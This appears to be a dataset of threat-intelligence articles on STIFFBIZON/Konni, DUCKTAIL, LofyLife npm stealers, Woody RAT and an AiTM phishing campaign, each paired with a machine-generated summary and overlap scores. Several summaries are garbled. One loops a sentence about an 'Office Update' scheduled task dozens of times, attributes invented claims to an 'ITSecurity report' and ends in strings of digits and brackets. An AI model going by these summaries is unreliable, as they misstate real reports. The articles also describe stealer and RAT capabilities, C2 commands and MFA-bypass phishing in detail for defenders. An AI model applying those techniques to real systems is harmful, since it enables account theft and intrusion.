Vault 7: CIA Hacking Tools Revealed, March 7, 2017 https://wikileaks.org/ciav7p1/ [5]: PowerShell-Suite/UAC-TokenMagic.ps1, July 15, 2017 https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1 [6]: Indicators of Compromise for Malware used by APT28, October 4, 2018 https://www.thecssc.com/wp-content/uploads/2018/10/4OctoberIOC-APT28-malware-advisory.pd f [7]: A deeper look at hacking groups and malware targeting Ukraine, April 27, 2022 https://therecord.media/a-deeper-look-at-hacking-groups-and-malware-targeting-ukraine/ [8] APT Attackers Flying More False Flags Than Ever, March 17, 2016 https://threatpost.com/apt-attackers-flying-more-false-flags-than-ever/116814/ [9] Securonix Threat Labs Initial Coverage Advisory: Analysis and Detection of BumbleBee Loader Using Securonix, July 5, 2022 https://www.securonix.com/blog/securonix-threat-labs-initial-coverage-advisory-analysis-and-detection-of-bumblebee-loader-using-securonix/ [10] Securonix Threat Labs Initial Coverage Advisory: Detecting Microsoft MSDT ""DogWalk"" .diagcab 0-Day Using Securonix, June 09, 2022 https://www.securonix.com/blog/detecting-microsoft-msdt-dogwalk/ [11] CISA Alert. Understanding and Mitigating Russian State-Sponsored Cyber Threats to U.S. Critical Infrastructure. March 01, 2022. https://www.cisa.gov/uscert/ncas/alerts/aa22-011a [13]: North Korea recognizes ""DPR"" and ""LPR"", July 13, 2022 https://ukrainetoday.org/2022/07/13/north-korea-recognizes-dpr/";"The Securonix Threat Research (STR) team has been observing and investigating a new attack campaign exploiting highvalue targets, including Czech Republic, Poland, and other countries. The attack campaign has been tracked by STR as STIFFBIZON. By Securonix Threat Labs, Threat Research: D. Iuzvyk, T. Peck, O. KolesnikovLast Updated: July 20, 2022IntroductionThe Securonix Threat Research (STR) team has been observing and investigating a new attack campaign exploiting highvalue targets, including Czech Republic, Poland, and other countries. The attack campaign has been tracked by STR as STIFFBIZON. Based on the tradecraft and artifacts observed by the Threat Research team as part of this ongoing campaign, some of the artifacts and tradecraft observed are known to be associated with Konni (APT37 in North Korea) malicious activity (see details below. )BackgroundKonni malware is classified as a RAT (remote access trojan) which was heavily used by APT37, contains builtin functions to elevate privileges and maintain persistence on the affected host. This particular malware was discovered in 2014 and has been attributed to the North Korean APT37 group[3].STIFFBIZON Attack Chain: High Level OverviewThe initial infil part of the attack chain is relatively trivial and unremarkable. The infection starts through phishing emails, which attempt to lure the victim to open a malicious attachment. In this particular case the threat actors attached a file containing the malware.The overall attack chain can be seen in Figure 1 below:Figure 1STIFFBIZON: Stage 1 initial The ITSecurity report indicates that the attacker has gained access to the victim's system. The attacker was able to download and execute a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates a new scheduled task called ""Office Update"". The scheduled task executes a PowerShell script encoded in Base64 which creates The ITSecurity report summarizes the security risks associated with the use of the Chromium browser. The report states that Chromium 80+ cookies are encrypted using AES256 GCM, with a state key which is stored in the Local State file. This state key is encrypted using DPAPI. The report also states that the use of the Chromium browser poses a security risk due to the fact that the state key is stored in the Local State file, which can be accessed by malicious users. The report further states that malicious users can use the state key to decrypt the AES256 GCM encrypted cookies. The report concludes by stating that the use of the Chromium browser poses a significant security risk. STIFFBIZON related activities are currently ongoing and something the Securonix Threat Research team is currently tracking. It is always important to consider the possibility of false flag operations where one APT group may be masquerading as another in order to avoid scrutiny. This is much more common with statesponsored attacks.Securonix mitigations and recommendationsSecure credentials. The ITSecurity report has been summarized. )))))1)))1)1) ""1) ""1) ""1) ""1 ""11111111111111191911101111111111111111131121111)1)12)1)14)1)14414141242)12)1)1)1)1)1242919191611111111111111111111111112121111111111212. 2. 51:15151000999999991919109999999999999992""1.9202.9.99999.5. ""5.5.1.1.1.100000000055155555) ""111111001) ""1) ""1) ""55555555)1)1) ""1) ""000055515151) ""1) ""1) ""1)1)))) ""1)1)1)1)1)1) ""1) ""1)1)))))1)1)1)1)1)1) ""1) ""1) ""1""1""1: "": "" "" "" ""1""1""1""1""1""1""1""1""19111191";en;{'r': 0.16735708367854185, 'p': 0.8244897959183674, 'f': 0.2782369117953104};{'r': 0.13330170777988615, 'p': 0.7060301507537688, 'f': 0.224261769075897};{'r': 0.16735708367854185, 'p': 0.8244897959183674, 'f': 0.2782369117953104}
https://labs.withsecure.com/publications/ducktail;DUCKTAIL: An infostealer malware targeting Facebook Business accounts;"WithSecure(tm) has discovered an ongoing operation (dubbed ""DUCKTAIL"") that targets individuals and organizations that operate on Facebook's Business and Ads platform.The threat actor targets individuals and employees that may have access to a Facebook Business account with an information-stealer malware. The malware is designed to steal browser cookies and take advantage of authenticated Facebook sessions to steal information from the victim's Facebook account and ultimately hijack any Facebook Business account that the victim has sufficient access to.Based upon analysis and gathered data, we have determined that the operation is conducted by a Vietnamese threat actor. The chain of evidence suggests that the threat actor's motives are financially driven.WithSecure had shared its DUCKTAIL research prior to release with Facebook's parent company Meta who provided the following statement:""We welcome security research into the threats targeting our industry. This is a highly adversarial space and we know these malicious groups will keep trying to evade our detection. We are aware of these particular scammers, regularly enforce against them, and continue to update our systems to detect these attempts. Because this malware is typically downloaded off-platform, we encourage people to be cautious about what software they install on their devices.""A full report containing detailed analysis of DUCKTAIL's malware component, recommendations and protection, as well as appendices containing indicators of compromise, detection opportunities, and MITRE ATT&CK techniques can be found in the PDF report.";"WithSecure has discovered an ongoing operation (dubbed ""DUCKTAIL"") that targets individuals and organizations that operate on Facebook's Business and Ads platform. The threat actor targets individuals and employees that may have access to a Facebook Business account with an informationstealer malware. The malware is designed to steal browser cookies and take advantage of authenticated Facebook sessions to steal information from the victim's Facebook account and ultimately hijack any Facebook Business account that the victim has sufficient access to. Based upon analysis and gathered data, we have determined that the operation is conducted by a Vietnamese threat actor. The chain of evidence suggests that the threat actor's motives are financially driven. WithSecure had shared its DUCKTAIL research prior to release with Facebook's parent company Meta who provided the following statement: ""We welcome security research into the threats targeting our industry. This is a highly adversarial space and we know these malicious groups will keep trying to evade our detection. We are aware of these particular scammers, regularly enforce against them, and continue to update our systems to detect these attempts. Because this malware is typically downloaded offplatform, we encourage people to be cautious about what software they install on their devices."" A full report containing detailed analysis of DUCKTAIL's malware component, recommendations and protection, as well as appendices containing indicators of compromise, detection opportunities, and MITRE ATT&CK techniques can be found in the PDF report.";en;{'r': 0.967948717948718, 'p': 0.9617834394904459, 'f': 0.964856225032};{'r': 0.9594594594594594, 'p': 0.9508928571428571, 'f': 0.9551569456727463};{'r': 0.967948717948718, 'p': 0.9617834394904459, 'f': 0.964856225032}
https://securelist.com/lofylife-malicious-npm-packages/107014/;LofyLife: malicious npm packages steal Discord tokens and bank card data;"On July 26, using the internal automated system for monitoring open-source repositories, we identified four suspicious packages in the Node Package Manager (npm) repository. All these packages contained highly obfuscated malicious Python and JavaScript code. We dubbed this malicious campaign ""LofyLife"".Description of the proc-title package (Translation: This package correctly capitalizes your titles as per the Chicago manual of style)The Python malware is a modified version of an open-source token logger called Volt Stealer. It is intended to steal Discord tokens from infected machines, along with the victim's IP address, and upload them via HTTP. The JavaScript malware we dubbed ""Lofy Stealer"" was created to infect Discord client files in order to monitor the victim's actions. It detects when a user logs in, changes email or password, enables/disables multi-factor authentication (MFA) and adds new payment methods, including complete bank card details. Collected information is also uploaded to the remote endpoint whose address is hard-coded.Data is exfiltrated to Replit-hosted instances:life.polarlabs.repl[.]coSock.polarlabs.repl[.]coidk.polarlabs.repl[.]coKaspersky solutions detect the threat with the following verdicts:HEUR:Trojan.Script.Lofy.genTrojan.Python.Lofy.aWe are constantly monitoring the updates to repositories to ensure that all new malicious packages are detected.Timeline of uploaded packagesPackage name Version Timestamp (UTC) small-sm 8.2.0 2022-07-17 20:28:29 small-sm 4.2.0 2022-07-17 19:47:56 small-sm 4.0.0 2022-07-17 19:43:57 small-sm 1.1.0 2022-06-18 16:19:47 small-sm 1.0.9 2022-06-17 12:23:33 small-sm 1.0.8 2022-06-17 12:22:31 small-sm 1.0.7 2022-06-17 03:36:45 small-sm 1.0.5 2022-06-17 03:31:40 pern-valids 1.0.3 2022-06-17 03:19:45 pern-valids 1.0.2 2022-06-17 03:12:03 lifeculer 0.0.1 2022-06-17 02:50:34 proc-title 1.0.3 2022-03-04 05:43:31 proc-title 1.0.2 2022-03-04 05:29:58We covered the incident in more detail in a private report delivered to customers of our Threat Intelligence Portal.";"On July 26, using the internal automated system for monitoring opensource repositories, we identified four suspicious packages in the Node Package Manager (npm) repository. All these packages contained highly obfuscated malicious Python and JavaScript code. We dubbed this malicious campaign ""LofyLife"".Description of the proctitle package (Translation: This package correctly capitalizes your titles as per the Chicago manual of style)The Python malware is a modified version of an opensource token logger called Volt Stealer. It is intended to steal Discord tokens from infected machines, along with the victim's IP address, and upload them via HTTP. The JavaScript malware we dubbed ""Lofy Stealer"" was created to infect Discord client files in order to monitor the victim's actions. It detects when a user logs in, changes email or password, enables/disables multifactor authentication (MFA) and adds new payment methods, including complete bank card details. Collected information is also uploaded to the remote endpoint whose address is hardcoded.Data is exfiltrated to Replithosted instances:life.polarlabs.repl[.]coSock.polarlabs.repl[.]coidk.polarlabs.repl[.]coKaspersky solutions detect the threat with the following verdicts:HEUR:Trojan.Script.Lofy.genTrojan.Python.Lofy.aWe are constantly monitoring the updates to repositories to ensure that all new malicious packages are detected.Timeline of uploaded packagesPackage name Version Timestamp (UTC) smallsm 8.2.0 20220717 20:28:29 smallsm 4.2.0 2022071";en;{'r': 0.7918781725888325, 'p': 0.9512195121951219, 'f': 0.8642659230196208};{'r': 0.6967509025270758, 'p': 0.910377358490566, 'f': 0.7893660482580787};{'r': 0.7918781725888325, 'p': 0.9512195121951219, 'f': 0.8642659230196208}
https://www.malwarebytes.com/blog/threat-intelligence/2022/08/woody-rat-a-new-feature-rich-malware-spotted-in-the-wild;Woody RAT: A new feature-rich malware spotted in the wild;"Posted: August 3, 2022 byThe Malwarebytes Threat Intelligence team has discovered a new Remote Access Trojan that we dubbed Woody Rat used to target Russian entities.This blog post was authored by Ankur Saini and Hossein JaziThe Malwarebytes Threat Intelligence team has identified a new Remote Access Trojan we are calling Woody Rat that has been in the wild for at least one year.This advanced custom Rat is mainly the work of a threat actor that targets Russian entities by using lures in archive file format and more recently Office documents leveraging the Follina vulnerability.Based on a fake domain registered by the threat actors, we know that they tried to target a Russian aerospace and defense entity known as OAK.In this blog post, we will analyze Woody Rat's distribution methods, capabilities as well as communication protocol.Distribution methodsBased on our knowledge, Woody Rat has been distributed using two different formats: archive files and Office documents using the Follina vulnerability.The earliest versions of this Rat was typically archived into a zip file pretending to be a document specific to a Russian group. When the Follina vulnerability became known to the world, the threat actor switched to it to distribute the payload, as identified by @MalwareHunterTeam.The following diagram shows the overall attack flow used by the threat actor to drop Woody Rat:Woody Rat distribution methodsArchive filesIn this method, Woody Rat is packaged into an archive file and sent to victims. We believe that these archive files have been distributed using spear phishing emails. Here are some examples of these archive files:anketa_brozhik.doc.zip: It contains Woody Rat with the same name: Anketa_Brozhik.doc.exe.zayavka.zip: It contains Woody Rat pretending to be an application (application for participation in the selection.doc.exe).Follina vulnerabilityThe threat actor is using a Microsoft Office document (???????.docx) that has weaponized with the Follina (CVE-2022-30190) vulnerability to drop Woody Rat. The used lure is in Russian is called ""Information security memo"" which provide security practices for passwords, confidential information, etc.Document lureWoody Rat AnalysisThe threat actor has left some debugging information including a pdb path from which we derived and picked a name for this new Rat:Debug InformationA lot of CRT functions seem to be statically linked, which leads to IDA generating a lot of noise and hindering analysis. Before initialization, the malware effectively suppresses all error reporting by calling SetErrorMode with 0x8007 as parameter.main functionAs we will see later, that malware uses multiple threads and so it allocates a global object and assigns a mutex to it to make sure no two clashing operations can take place at the same time. This object enforces that only one thread is reaching out to the C2 at a given time and that there are no pending requests before making another request.Deriving the CookieThe malware communicates with its C2 using HTTP requests. To uniquely identify each infected machine, the malware derives a cookie from machine specific values. The values are taken from the adapter information, computer name and volume information, and 8 random bytes are appended to this value to avoid any possible cookie collisions by the malware.A combination of GetAdaptersInfo, GetComputerNameA and GetVolumeInformationW functions are used to retrieve the required data to generate the cookie. This cookie is sent with every HTTP request that is made to the C2.get_cookie_data functionData encryption with HTTP requestsTo evade network-based monitoring the malware uses a combination of RSA-4096 and AES-CBC to encrypt the data sent to the C2. The public key used for RSA-4096 is embedded inside the binary and the malware formulates the RSA public key blob at runtime using the embedded data and imports it using the BCryptImportKeyPair function.The malware derives the key for AES-CBC at runtime by generating 32 random bytes, these 32 bytes are then encrypted with RSA-4096 and sent to the C2. Both the malware and C2 simultaneously use these bytes to generate the AES-CBC key using BCryptGenerateSymmetricKey which is used in subsequent HTTP requests to encrypt and decrypt the data. For encryption and decryption the malware uses BCryptEncrypt and BCryptDecrypt respectively.RSA Encryption routineAES Encryption RoutineC2 HTTP endpoint requestknock - This is the first HTTP request that the malware makes to the C2. The machine-specific cookie is sent as part of the headers here. This is a POST request and the data of this request contains 32 random bytes which are used to derive AES-CBC key, while the 32 bytes are RSA-4096 encrypted.The data received as response for this request is decrypted and it contains the url path to submit (/submit) the additional machine information which the malware generates after this operation.knock request headerssubmit - This endpoint request is used to submit information about the infected machine. The data sent to the C2 is AES-CBC encrypted. Data sent via submit API includes:OSArchitectureAntivirus installedComputer NameOS Build Version.NET informationPowerShell informationPython information (Install path, version etc.)Storage drives - includes Drive path, Internal name etc.Environment VariablesNetwork InterfacesAdministrator privilegesList of running processesProxy informationUsernameList of all the User accountsThe malware currently detects 6 AVs through Registry Keys, these AVs being Avast Software, Doctor Web, Kaspersky, AVG, ESET and Sophos.ping - The malware makes a ping GET http request to the C2 at regular intervals. If the C2 responds with ""_CRY"" then the malware proceeds to send the knock request again but if the C2 responds with ""_ACK"" the response contains additional information about which command should be executed by the malware.The malware supports a wide variety of commands which are classified into _SET and _REQ requests as seen while analyzing the malware. We will dive into all these commands below in the blog.C2 CommandsThe malware uses a specific thread to communicate with the C2 and a different one to execute the commands received from the C2. To synchronize between both threads, the malware leverages events and mutex. To dispatch a command it modifies the state of the event linked to that object. We should note all the communications involved in these commands are AES encrypted.Command execution routine_SET CommandsPING - This command is used to set the sleep interval between every ping request to the C2.- This command is used to set the sleep interval between every ping request to the C2. PURG - Unknown command- Unknown command EXIT - Exit the command execution thread._REQ CommandsEXEC (Execute)- Executes the command received from the C2 by creating a cmd.exe process, the malware creates two named pipes and redirects the input and output to these pipes. The output of the command is read using ReadFile from the named pipe and then ""_DAT"" is appended to this data before it is AES encrypted and sent to the C2.EXEC commandUPLD (Upload) - The Upload command is used to remotely upload a file to the infected machine. The malware makes a GET request to the C2 and receives data to be written as file.(Upload) - The Upload command is used to remotely upload a file to the infected machine. The malware makes a GET request to the C2 and receives data to be written as file. INFO (Submit Information) - The INFO command is similar to the ""submit"" request above, this command sends the exact information to the C2 as sent by the ""submit"" request.INFO commandUPEX (Upload and Execute) - This is a combination of UPLD and EXEC command. The commands first writes a file received from the C2 and then executes that file.(Upload and Execute) - This is a combination of UPLD and EXEC command. The commands first writes a file received from the C2 and then executes that file. DNLD (Download) - The DNLD command allows the C2 to retrieve any file from the infected machine. The malware encrypts the requested file and sends the data via a POST request to the C2.(Download) - The DNLD command allows the C2 to retrieve any file from the infected machine. The malware encrypts the requested file and sends the data via a POST request to the C2. PROC (Execute Process) - The PROC command is similar to the EXEC command with slight differences, here the process is directly executed instead of executing it with cmd.exe as in EXEC command. The command uses the named pipes in similar fashion as used by the EXEC command.(Execute Process) - The PROC command is similar to the EXEC command with slight differences, here the process is directly executed instead of executing it with cmd.exe as in EXEC command. The command uses the named pipes in similar fashion as used by the EXEC command. UPPR (Upload and Execute Process) - This is a combination of UPLD and PROC command. The command receives the remote file using the upload command then executes the file using PROC command.(Upload and Execute Process) - This is a combination of UPLD and PROC command. The command receives the remote file using the upload command then executes the file using PROC command. SDEL (Delete File) - This is used to delete any file on the infected system. It also seems to overwrite the first few bytes of the file to be deleted with random data.(Delete File) - This is used to delete any file on the infected system. It also seems to overwrite the first few bytes of the file to be deleted with random data. _DIR (List directory) - This can list all the files and their attributes in a directory supplied as argument. If no directory is supplied, then it proceeds to list the current directory. File attributes retrieved by this command are: Filename Type (Directory, Unknown, File) Owner Creation time Last access time Last write time Size Permissions(List directory) - This can list all the files and their attributes in a directory supplied as argument. If no directory is supplied, then it proceeds to list the current directory. File attributes retrieved by this command are: STCK (Command Stack) - This allows the attacker to execute multiple commands with one request. The malware can receive a STCK command which can have multiple children commands which are executed in the same order they are received by the malware.(Command Stack) - This allows the attacker to execute multiple commands with one request. The malware can receive a STCK command which can have multiple children commands which are executed in the same order they are received by the malware. SCRN (Screenshot) - This command leverages Windows GDI+ to take the screenshot of the desktop. The image is then encrypted using AES-CBC and sent to the C2.(Screenshot) - This command leverages Windows GDI+ to take the screenshot of the desktop. The image is then encrypted using AES-CBC and sent to the C2. INJC (Process Injection) - The malware seems to generate a new AES key for this command. The code to be injected is received from the C2 and decrypted. To inject the code into the target process it writes it to the remote memory using WriteProcessMemory and then creates a remote thread using CreateRemoteThread.INJC routinePSLS (Process List) - Calls NtQuerySystemInformation with SystemProcessInformation to retrieve an array containing all the running processes. Information sent about each process to the C2: PID ParentPID Image Name Owner(Process List) - Calls NtQuerySystemInformation with SystemProcessInformation to retrieve an array containing all the running processes. Information sent about each process to the C2: DMON (Creates Process) - The command seems similar to PROC with the only difference being the output of the process execution is not sent back to the C2. It receives the process name from the C2 and executes it using CreateProcess.(Creates Process) - The command seems similar to PROC with the only difference being the output of the process execution is not sent back to the C2. It receives the process name from the C2 and executes it using CreateProcess. UPDM (Upload and Create Process) - Allows the C2 and upload a file and then execute it using DMON command.SharpExecutor and PowerSession CommandsInterestingly, the malware has 2 .NET DLLs embedded inside. These DLLs are named WoodySharpExecutor and WoodyPowerSession respectively. WoodySharpExecutor provides the malware ability to run .NET code received from the C2. WoodyPowerSession on the other hand allows the malware to execute PowerShell commands and scripts received from the C2.WoodyPowerSession makes use of pipelines to execute these PS commands. The .NET dlls are loaded by the malware and commands are executed via the methods present in these DLLs:SharpExecutor and PowerSession methodsWe will look at the commands utilising these DLLs below:DN_B (DotNet Binary) - This command makes use of the RunBinaryStdout method to execute Assembly code with arguments received from the C2. The code is received as an array of Base64 strings separated by 0x20 character.(DotNet Binary) - This command makes use of the RunBinaryStdout method to execute Assembly code with arguments received from the C2. The code is received as an array of Base64 strings separated by 0x20 character. DN_D (DotNet DLL) - This method provides the attacker a lot more control over the execution. An attacker can choose whether to send the console output back to the C2 or not. The method receives an array of Base64 strings consisting of code, class name, method name and arguments. The DLL loads the code and finds and executes the method based on other arguments received from the C2.(DotNet DLL) - This method provides the attacker a lot more control over the execution. An attacker can choose whether to send the console output back to the C2 or not. The method receives an array of Base64 strings consisting of code, class name, method name and arguments. The DLL loads the code and finds and executes the method based on other arguments received from the C2. PSSC (PowerSession Shell Command) - Allows the malware to receive a Base64 encoded PowerShell command and execute it.(PowerSession Shell Command) - Allows the malware to receive a Base64 encoded PowerShell command and execute it. PSSS (PowerSession Shell Script) - This command allows the malware to load and execute a Base64 encoded PowerShell script received from the C2.(PowerSession Shell Script) - This command allows the malware to load and execute a Base64 encoded PowerShell script received from the C2. PSSM (PowerSession Shell Module) - This command receives an array of Base64 encoded strings, one of which contains the module contents and the other one contains the module name. These strings are decoded and this module is imported to the command pipeline and then invoked.Malware CleanupAfter creating the command threads, the malware deletes itself from disk. It uses the more commonly known ProcessHollowing technique to do so. It creates a suspended notepad process and then writes shellcode to delete a file into the suspended process using NtWriteVirtualMemory. The entry point of the thread is set by using the NtSetContextThread method and then the thread is resumed. This leads to the deletion of the malware from disk.Malware deletes itselfUnknown threat actorThis very capable Rat falls into the category of unknown threat actors we track. Historically, Chinese APTs such as Tonto team as well as North Korea with Konni have targeted Russia. However, based on what we were able to collect, there weren't any solid indicators to attribute this campaign to a specific threat actor.Malwarebytes blocks the Follina exploit that is being leveraged in the latest Woody Rat campaign. We also already detected the binary payloads via our heuristic malware engines.IOCsWoodyRat:982ec24b5599373b65d7fec3b7b66e6afff4872847791cf3c5688f47bfcb8bf066378c18e9da070629a2dbbf39e5277e539e043b2b912cc3fed0209c48215d0bb65bc098b475996eaabbb02bb5fee19a18c6ff2eee0062353aff696356e73b7a43b15071268f757027cf27dd94675fdd8e771cdcd77df6d2530cb8e218acc2ce408f314b0a76a0d41c99db0cb957d10ea8367700c757b0160ea925d6d7b5dd8e0588c52582aad248cf0c43aa44a33980e3485f0621dba30445d8da45bba4f8345c5020ee0f7a5b78a6da74a3f58710cba62f727959f8ece795b0f47828e33e803ba32825177d7c2aac957ff1fc5e78b64279aeb748790bc90634e792541de8d39bc071fb6a1d9e72c50aec88b4317c3eb7c0f5ff5906b00aa00d9e720cbc828dC2s:kurmakata.duckdns[.]orgmicrosoft-ru-data[.]ru194.36.189.179microsoft-telemetry[.]ruoakrussia[.]ruFollina Doc:???????.docxffa22c40ac69750b229654c54919a480b33bc41f68c128f5e3b5967d442728fbFollina html file:garmandesar.duckdns[.]org:444/uoqiuwef.htmlWoody Rat url:fcloud.nciinform[.]ru/main.css (edited)";"The ITSecurity report states that the malware leverages events and mutex to synchronize between both threads. To dispatch a command it modifies the state of the event linked to that object. We should note all the communications involved in these commands are AES encrypted. Command execution routine_SET CommandsPING This command is used to set the sleep interval between every ping request to the C2. This command is used to set the sleep interval between every ping request to the C2. PURG Unknown command Unknown command EXIT Exit the command execution thread._REQ CommandsEXEC (Execute) Executes the command received from the C2 by creating a cmd.exe process, the malware creates two named pipes and redirects the input and output to these pipes. The output of the command is read using ReadFile from the named pipe and then ""_DAT"" is appended to this data before it is AES encrypted and sent to the C2.EXEC commandUPLD (Upload) The Upload command is used to remotely upload a file to the infected machine. The malware makes a GET request to the C2 and receives data to be written as file. (Upload) The Upload command is used to remotely upload a file to the infected machine. The malware makes a GET request to the C2 and receives data to be written as file. INFO (Submit Information) The INFO command is similar to the ""submit"" request above; this command sends the exact information to the C2 as sent by the ""submit"" request.INFO commandUPEX (Upload and Execute) This is a combination of UPLD and EXEC command. The commands first receives the remote file using the upload command then executes the file using PROC command. (Upload and Execute Process) This is a combination of UPLD and PROC command";en;{'r': 0.15558510638297873, 'p': 0.9590163934426229, 'f': 0.26773455137367846};{'r': 0.1170343137254902, 'p': 0.9009433962264151, 'f': 0.20715834937497946};{'r': 0.15159574468085107, 'p': 0.9344262295081968, 'f': 0.26086956281532614}
https://www.zscaler.com/blogs/security-research/large-scale-aitm-attack-targeting-enterprise-users-microsoft-email-services;AITM Attack Targeting Microsoft Email Users;"SummaryThreatLabz has discovered a new strain of a large-scale phishing campaign, which uses adversary-in-the-middle (AiTM) techniques along with several evasion tactics. Similar AiTM phishing techniques were used in another phishing campaign described by Microsoft recently here.In June 2022, researchers at ThreatLabz observed an increase in the use of advanced phishing kits in a large-scale campaign. Through intelligence gathered from the Zscaler cloud, we discovered several newly registered domains that are used in an active credential-stealing phishing campaign.This campaign stands out from other commonly seen phishing attacks in several ways. It uses an adversary-in-the-middle (AiTM) attack technique capable of bypassing multi-factor authentication. There are multiple evasion techniques used in various stages of the attack designed to bypass conventional email security and network security solutions.The campaign is specifically designed to reach end users in enterprises that use Microsoft's email services. Business email compromise (BEC) continues to be an ever-present threat to organizations and this campaign further highlights the need to protect against such attacks.In this blog, we describe details of the tactics, techniques and procedures (TTPs) involved in the campaign.Since the campaign is active at the time of blog publication, the list of indicators of compromise (IOCs) included at the end of the blog should not be considered an exhaustive list.Key pointsCorporate users of Microsoft's email services are the main targets of this large-scale phishing campaign.All these phishing attacks begin with an email sent to the victim with a malicious link.The campaign is active at the time of blog publication and new phishing domains are registered almost every day by the threat actor.In some cases, the business emails of executives were compromised using this phishing attack and later used to send further phishing emails as part of the same campaign.Some of the key industry verticals such as FinTech, Lending, Insurance, Energy and Manufacturing in geographical regions such as the US, UK, New Zealand and Australia are targeted.A custom proxy-based phishing kit capable of bypassing multi-factor authentication (MFA) is used in these attacks.Various cloaking and browser fingerprinting techniques are leveraged by the threat actor to bypass automated URL analysis systems.Numerous URL redirection methods are used to evade corporate email URL analysis solutions.Legitimate online code editing services such as CodeSandbox and Glitch are abused to increase the shelf life of the campaign.Phishing campaign overviewBeginning in June 2022, ThreatLabz observed a sharp increase in advanced phishing attacks targeting specific industries and geographies.We identified several newly registered domains set up by the threat actor to target Microsoft mail services' users.Based on our cloud data telemetry, the majority of the targeted organizations were in the FinTech, Lending, Finance, Insurance, Accounting, Energy and Federal Credit Union industries. This is not an exhaustive list of industry verticals targeted.A majority of the targeted organizations were located in the United States, United Kingdom, New Zealand, and Australia.After analyzing the large volume of domains used in this campaign, we identified some interesting domain name patterns which we highlight below.Domains spoofing Federal Credit UnionsSome of the attacker-registered domains were typosquatted versions of legit Federal Credit Unions in the US.Attacker-registered domain name Legit Federal Credit Union domain name crossvalleyfcv[.]org crossvalleyfcu[.]org triboro-fcv[.]org triboro-fcu[.]org cityfederalcv[.]com cityfederalcu[.]com portconnfcuu[.]com portconnfcu[.]com oufcv[.]com oufcu[.]comNote: Per our analysis of the original emails using the Federal Credit Union theme, we observed an interesting pattern. These emails originated from the email addresses of the chief executives of the respective Federal Credit Union organizations. This indicates that the threat actor might have compromised the corporate emails of chief executives of these organizations using this phishing attack and later used these compromised business emails to send further phishing emails as part of the same campaign.Domains spoofing password reset themeSome of the domain names used keywords related to ""password reset"" and ""password expiry"" reminders. This might indicate that the theme of the corresponding phishing emails was also related to password reset reminders.expiryrequest-mailaccess[.]comexpirationrequest-passwordreminder[.]comemailaccess-passwordnotice[.]comemailaccess-expirynotification[.]comIt is important to note that there are several other domains involved in this active campaign, some of them are completely randomized while others do not conform to any specific pattern.Distribution mechanismWe have limited visibility into the emails used to distribute the phishing URLs. In some cases, the malicious links were sent directly in the email body, in other cases, the link was present inside the HTML file attached to the email.Figure 1 below shows an email which contained an HTML attachment with the malicious phishing URL embedded inside it.Figure 1: phishing email sent to the user with HTML attachmentFigure 2 below shows the contents of the HTML attachment. It uses window.location.replace() to redirect the user to the phishing page when the HTML page is opened with the browser.Figure 2: HTML attachment used to redirect the user to the phishing pageFigure 3 below shows an example of a phishing email in which the attacker sent the malicious link directly in the email body.Figure 3: Malicious link present in the email bodyWe observed the use of a variety of URL redirection methods in a large number of cases. Instead of sending the actual phishing URL in the email, the attacker would send links that used a variety of redirection methods to load the final phishing page URL. We describe the details of some of these methods in the following section.Abuse of legitimate web resources for redirectionsPhishing sites were seen being delivered, redirected into, and hosted using numerous methods.A common method of hosting redirection code is making use of web code editing/hosting services: the attacker is able to use those sites, meant for legitimate use by web developers, to rapidly create new code pages, paste into them a redirect code with the latest phishing site's URL, and proceed to mail the link to the hosted redirect code to victims en masse.These services provide flexibility to the attackers, since the contents of the redirect codes can be changed at any time. It has been observed that in the midst of a campaign, attackers will modify the code of a redirect page and update a phishing site's URL that has been flagged as malicious, to a fresh undetected URL.The most commonly abused service for this purpose is CodeSandbox .Figure 4 below shows the most common redirect code hosted on CodeSandbox, utilized by the phishing site.Figure 4: redirect code snippet on an attacker-controlled CodeSandbox instanceFigure 5 below shows an example of redirect code hosted on a similarly abused service - Glitch .Figure 5: redirect code hosted on an attacker-controlled Glitch instance.Many dozens, if not hundreds, of different CodeSandbox code pages were observed hosting different redirect codes to the phishing sites.Many of those pages were authored by a network of registered CodeSandbox users, letting us see the names of the Google accounts used for their registration.While most Google accounts we could find are anonymous throwaway accounts that are a dead end to attribution efforts, an internet search of a few account names tie some of the authors to older, more primitive phishing campaigns, and also show a history of engaging in cryptocurrency investment/recovery scams.Another method observed for URL redirection is the abuse of Open Redirect pages hosted by Google Ads and Snapchat. Figure 6 shows more details.Figure 6: different methods of URL redirection abusing Open Redirect pagesBrowsing to these links will immediately redirect the client to the URL specified in the GET parameter highlighted in blue colour.This method gives the attackers the benefit of being able to send emails with links pointing to these legitimate sites as the entry point, with the actual phishing sites' addresses only appearing somewhere in the GET parameters, raising the likelihood of evading scanning of malicious URLs performed by email clients.Fingerprinting-based evasionThis campaign utilizes a client fingerprinting process on all phishing sites that we will cover in this article. This process happens immediately upon the page being visited.The initial page clients are served consists of JavaScript code, ripped from the FingerprintJS project , whose purpose is to collect information from the client's browser in order to help the site determine if the person behind the browser is in fact not an unsuspecting victim, but an unwelcome probing analyst or an automated bot.The script gathers identifying information such as the client's operating system, screen dimensions, and timezone, and communicates its findings back to the site by WebSocket traffic. The complete list of information gathered from the client's machine is mentioned in the Appendix at the end of the blog.Figure 7: Client fingerprint data sent to the server over websocketWith this information received, the site arrives at a verdict whether it should continue reeling in the client, or should it get rid of it by redirecting to the Google homepage.How exactly the site decides this is unknown since the logic is present on the server side, but it has been observed that browsers running in virtual machines are detected by examining 